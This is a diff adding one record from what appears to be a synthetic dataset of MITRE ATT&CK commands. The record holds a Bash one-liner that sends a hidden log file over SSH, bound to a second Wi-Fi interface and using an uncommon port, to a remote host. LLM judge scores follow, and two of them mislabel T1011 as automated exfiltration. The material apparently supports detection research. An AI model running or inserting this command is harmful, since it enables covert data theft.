@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan2 >/dev/null 2>&1 && cat /home/user/.local/share/.sync.log | ssh -q -o ConnectTimeout=5 -o BindAddress=\"$(ip -4 addr show wlan2 | awk '/inet /{print $2}' | cut -d/ -f1)\" -p 49377 exfil@10.55.88.25 \"cat > ~/rx/.sync.log\"",
+  "explanation": "Pipes a file over SSH bound to the wlan2 source IP on a high port, ensuring exfiltration over a separate Wi‑Fi medium consistent with T1011.",
+  "rationale_steps": [
+    "Use iwconfig to confirm wlan2 availability without modifying settings.",
+    "Bind SSH to wlan2’s IP to force the transfer over the alternate medium.",
+    "Use an uncommon SSH port to avoid standard service profiles while not changing system-wide routes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-3aa1aba8",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting, valid ssh options (including -o BindAddress via command substitution), correct redirections, and proper use of pipes and conditionals.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates a local file over SSH bound to the wlan2 source IP to a remote host (an automated scripted transfer), though it lacks scheduling/batching elements often associated with Automated Exfiltration.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T05:06:53.373415Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct syntax for conditional execution, piping, and redirection.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully aligns with T1011 (Automated Exfiltration) by checking for a specific network interface (wlan2), then exfiltrating log data over SSH to a remote server using a specific port (49377) and binding to the wlan2 interface IP address.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T05:06:56.308672Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, correct command separators, valid flags, and properly nested command substitution.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively and plausibly exfiltrates the specified file over SSH, explicitly binding to the wlan2 interface and using a high port, aligning perfectly with T1011.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T05:07:08.395907Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
